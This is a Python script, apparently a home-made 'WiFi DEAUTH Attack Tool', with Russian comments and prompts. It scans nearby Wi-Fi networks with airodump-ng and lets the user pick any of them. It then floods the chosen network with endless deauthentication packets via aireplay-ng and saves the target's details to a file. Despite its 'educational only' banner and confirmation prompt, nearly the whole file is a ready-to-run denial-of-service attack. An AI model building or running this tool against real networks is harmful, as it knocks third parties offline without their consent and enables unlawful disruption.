import subprocess
import time
import os
import re
import sys

# Функция для запуска команды
def run_cmd(cmd, show_output=False):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        if show_output:
            print(result.stdout)
            if result.stderr:
                print(f"Ошибка: {result.stderr}")
        return result.stdout
    except subprocess.TimeoutExpired:
        print("Таймаут команды")
        return ""
    except Exception as e:
        print(f"Ошибка выполнения команды: {e}")
        return ""

# Проверка прав
if os.geteuid() != 0:
    print("Запусти с sudo: sudo python3 wifi_attack.py")
    exit()

# ========== ФАЗА 1: СКАНИРОВАНИЕ СЕТЕЙ ==========
def scan_wifi():
    print("="*60)
    print("ШАГ 1: АКТИВАЦИЯ РЕЖИМА МОНИТОРА")
    print("="*60)
    
    # Останавливаем интерфейсы
    run_cmd("sudo airmon-ng check kill", True)
    time.sleep(2)
    
    # Включаем режим мониторинга
    print("\nАктивирую режим монитора...")
    output = run_cmd("sudo airmon-ng start wlan0", True)
    
    # Проверяем успешность
    if "monitor mode enabled" not in output.lower():
        print("Не удалось включить режим монитора!")
        return None
    
    time.sleep(3)
    
    print("\n" + "="*60)
    print("ШАГ 2: СКАНИРОВАНИЕ WIFI СЕТЕЙ")
    print("="*60)
    
    # Сканируем сети
    print("Сканирую WiFi сети (10 секунд)...")
    run_cmd("timeout 10 sudo airodump-ng wlan0mon --output-format csv -w scan_result 2>/dev/null", False)
    time.sleep(2)
    
    # Ищем созданный CSV файл
    csv_file = None
    for file in os.listdir('.'):
        if file.startswith('scan_result-') and file.endswith('.csv'):
            csv_file = file
            break
    
    if not csv_file:
        print("Не удалось найти результаты сканирования!")
        return None
    
    wifi_dict = {}
    
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            lines = content.strip().split('\n')
            
            network_section = True
            for line in lines:
                line = line.strip()
                
                # Определяем где начинается список клиентов
                if line.startswith('Station MAC'):
                    network_section = False
                    continue
                
                if not line or not network_section:
                    continue
                
                # Парсим CSV строку
                parts = line.split(',')
                if len(parts) > 13 and ':' in parts[0] and parts[0].strip():
                    bssid = parts[0].strip()
                    
                    # Проверяем, что это MAC-адрес
                    if len(bssid) == 17 and bssid.count(':') == 5:
                        channel = parts[3].strip() if parts[3] else "1"
                        
                        # Ищем SSID (после 13-го поля)
                        ssid = ""
                        for i in range(13, len(parts)):
                            if parts[i] and parts[i].strip():
                                ssid = parts[i].strip()
                                break
                        
                        if not ssid or ssid == " ":
                            ssid = "<HIDDEN>"
                        
                        # Очистка SSID
                        ssid = ''.join(c for c in ssid if c.isprintable() and 32 <= ord(c) < 127)
                        
                        # Мощность сигнала
                        power = parts[8].strip() if len(parts) > 8 else "0"
                        
                        wifi_dict[bssid] = {
                            'BSSID': bssid,
                            'SSID': ssid[:30],
                            'CHANNEL': channel,
                            'POWER': power,
                            'INDEX': len(wifi_dict) + 1
                        }
        
        # Удаляем временный файл
        os.remove(csv_file)
        
    except Exception as e:
        print(f"Ошибка обработки файла: {e}")
        return None
    
    return wifi_dict

# ========== ФАЗА 2: ВЫБОР СЕТИ ==========
def select_network(wifi_dict):
    if not wifi_dict:
        print("Сети не найдены!")
        return None
    
    print("\n" + "="*60)
    print("НАЙДЕННЫЕ СЕТИ:")
    print("="*60)
    print(f"{'№':<4} {'SSID':<25} {'BSSID':<18} {'CH':<4} {'PWR':<6}")
    print("-"*60)
    
    # Создаем список для простого доступа по номеру
    network_list = list(wifi_dict.values())
    network_list.sort(key=lambda x: int(x['POWER']) if x['POWER'].lstrip('-').isdigit() else 0, reverse=True)
    
    for i, net in enumerate(network_list, 1):
        net['DISPLAY_INDEX'] = i
        ssid_display = net['SSID'] if len(net['SSID']) <= 23 else net['SSID'][:20] + "..."
        print(f"{i:<4} {ssid_display:<25} {net['BSSID']:<18} {net['CHANNEL']:<4} {net['POWER']:<6}")
    
    print("="*60)
    
    # Выбор сети
    while True:
        try:
            choice = input(f"\nВыберите номер сети (1-{len(network_list)}) или 0 для выхода: ").strip()
            
            if choice == '0':
                print("Выход...")
                return None
            
            choice_num = int(choice)
            if 1 <= choice_num <= len(network_list):
                selected_net = network_list[choice_num - 1]
                
                # Находим оригинальный BSSID в словаре
                for bssid, net in wifi_dict.items():
                    if net['SSID'] == selected_net['SSID'] and net['BSSID'] == selected_net['BSSID']:
                        return net
                
                return selected_net
            else:
                print(f"Введите число от 1 до {len(network_list)}")
                
        except ValueError:
            print("Введите корректный номер!")
        except KeyboardInterrupt:
            print("\nПрервано пользователем")
            return None

# ========== ФАЗА 3: АТАКА DEAUTH ==========
def launch_attack(selected_network):
    if not selected_network:
        return
    
    print("\n" + "="*60)
    print("ШАГ 3: НАСТРОЙКА И АТАКА")
    print("="*60)
    
    bssid = selected_network['BSSID']
    channel = selected_network['CHANNEL']
    ssid = selected_network['SSID']
    
    print(f"\nВыбрана сеть:")
    print(f"  SSID:    {ssid}")
    print(f"  BSSID:   {bssid}")
    print(f"  Канал:   {channel}")
    
    # 1. Устанавливаем канал
    print(f"\n[1/3] Устанавливаю канал {channel}...")
    result = run_cmd(f"sudo iw dev wlan0mon set channel {channel}", True)
    if result or "set channel" in result.lower():
        print(f"✓ Канал установлен на {channel}")
    else:
        print("⚠ Проверка канала...")
        run_cmd(f"iwconfig wlan0mon channel {channel}", True)
    
    time.sleep(2)
    
    # 2. Подтверждение перед атакой
    print("\n[2/3] Подготовка к атаке...")
    print("="*40)
    print("ВНИМАНИЕ: Атака DEAUTH нарушает работу WiFi сети!")
    print("Используйте только в тестовых целях на своих сетях!")
    print("="*40)
    
    confirm = input("\nНачать атаку DEAUTH? (y/N): ").strip().lower()
    if confirm != 'y':
        print("Атака отменена")
        return
    
    # 3. Запуск атаки
    print("\n[3/3] Запуск DEAUTH атаки...")
    print("="*60)
    print("Атака запущена! Для остановки нажмите Ctrl+C")
    print("="*60)
    
    # Сохраняем информацию о цели в файл
    with open('target_info.txt', 'w') as f:
        f.write(f"Цель атаки:\n")
        f.write(f"SSID: {ssid}\n")
        f.write(f"BSSID: {bssid}\n")
        f.write(f"Канал: {channel}\n")
        f.write(f"Время начала: {time.ctime()}\n")
    
    try:
        # Запускаем атаку в отдельном процессе
        print(f"\nЗапускаю: sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon")
        print("-"*60)
        
        # Вариант 1: Прямой запуск с видимым выводом
        process = subprocess.Popen(
            f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon",
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Читаем вывод в реальном времени
        try:
            while True:
                output = process.stdout.readline()
                if output:
                    print(output.strip())
                elif process.poll() is not None:
                    break
                time.sleep(0.1)
                    
        except KeyboardInterrupt:
            print("\n\nОстанавливаю атаку...")
            process.terminate()
            process.wait()
            
    except Exception as e:
        print(f"Ошибка при запуске атаки: {e}")
    
    finally:
        # Завершающие действия
        cleanup()

# ========== ОЧИСТКА ==========
def cleanup():
    print("\n" + "="*60)
    print("ШАГ 4: ОЧИСТКА И ВОССТАНОВЛЕНИЕ")
    print("="*60)
    
    print("\nОстанавливаю режим монитора...")
    run_cmd("sudo airmon-ng stop wlan0mon 2>/dev/null", True)
    
    print("\nПерезапускаю NetworkManager...")
    run_cmd("sudo systemctl restart NetworkManager 2>/dev/null", False)
    run_cmd("sudo systemctl restart wpa_supplicant 2>/dev/null", False)
    
    print("\nВосстанавливаю WiFi интерфейс...")
    run_cmd("sudo ifconfig wlan0 up 2>/dev/null", False)
    
    time.sleep(3)
    print("\n✓ Очистка завершена!")
    print("\nИнформация о цели сохранена в target_info.txt")

# ========== ГЛАВНАЯ ФУНКЦИЯ ==========
def main():
    print("""
╔══════════════════════════════════════════════╗
║         WiFi DEAUTH Attack Tool v1.0         ║
║    Только для образовательных целей!         ║
╚══════════════════════════════════════════════╝
""")
    
    try:
        # 1. Сканирование
        wifi_dict = scan_wifi()
        
        if not wifi_dict:
            print("Не найдено ни одной WiFi сети. Проверьте адаптер.")
            cleanup()
            return
        
        # 2. Выбор сети
        selected = select_network(wifi_dict)
        
        if not selected:
            cleanup()
            return
        
        # 3. Атака
        launch_attack(selected)
        
    except KeyboardInterrupt:
        print("\n\nПрограмма прервана пользователем")
        cleanup()
    except Exception as e:
        print(f"\nКритическая ошибка: {e}")
        cleanup()

# Запуск программы
if __name__ == "__main__":
    main()